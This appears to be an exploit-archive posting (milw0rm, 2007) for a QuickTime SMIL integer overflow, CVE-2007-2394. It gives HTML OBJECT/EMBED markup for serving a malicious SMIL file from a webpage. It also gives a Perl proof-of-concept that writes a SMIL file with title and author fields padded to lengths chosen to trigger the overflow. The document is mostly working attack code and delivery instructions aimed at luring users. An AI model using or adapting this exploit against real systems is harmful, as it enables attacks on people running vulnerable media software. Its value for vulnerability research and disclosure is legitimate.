@@ -1,0 +1,65 @@
+----------------------------------------------------------------------
+ATTACK VECTORS
+----------------------------------------------------------------------
+
+This vulnerability can be triggered by luring a target user into
+running a malicious SMIL file locally or via a webpage. In the later
+scenario the OBJECT (IE) and/or EMBED (FireFox) tags can be used:
+
+<OBJECT
+  CLASSID="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B"
+  CODEBASE="http://www.apple.com/qtactivex/qtplugin.cab"
+  WIDTH="10" HEIGHT="10" >
+  <!-- malicious SMIL file -->
+  <PARAM NAME="src" VALUE="poc.smil" />
+  <EMBED
+    <!-- available .qtif or .mov file to start up QT for FF -->
+    SRC="available-sample.qtif"
+    <!-- malicious SMIL file -->
+    QTSRC="poc.smil"
+    WIDTH="10" HEIGHT="10"
+    PLUGINSPAGE=" www.apple.com/quicktime/download"
+    TYPE="video/quicktime"
+  />
+</OBJECT>
+
+----------------------------------------------------------------------
+PROOF OF CONCEPT
+----------------------------------------------------------------------
+
+#!/usr/bin/perl -w
+
+####
+# QuickTime SMIL integer overflow vulnerability (CVE-2007-2394) POC
+#
+# Researched on QuickTime 7.1.3 on Windows 2000 SP4.
+#
+# David Vaartjes <d.vaartjes at gmail.com>
+####
+
+$file = " poc.smil";
+$padd = "x";
+$cop_len = 36;
+
+####
+# By choosing the following lengths the
+# integer overflow will be triggered.
+####
+
+$tit_len = 223;
+$auth_len = 65280;
+
+open(FH,">$file") or die "Can't open file:$!";
+
+print FH
+ "<smil>\n".
+ "<head>\n".
+ " <meta name=\"title\" content=\"".$padd x $tit_len."\"/>\n".
+ " <meta name=\"author\" content=\"".$padd x $auth_len."\"/>\n".
+ " <meta name=\"copyright\" content=\"".$padd x $cop_len."\"/>\n".
+ "</head>\n".
+ "</smil>";
+
+close(FH);
+
+# milw0rm.com [2007-09-03]
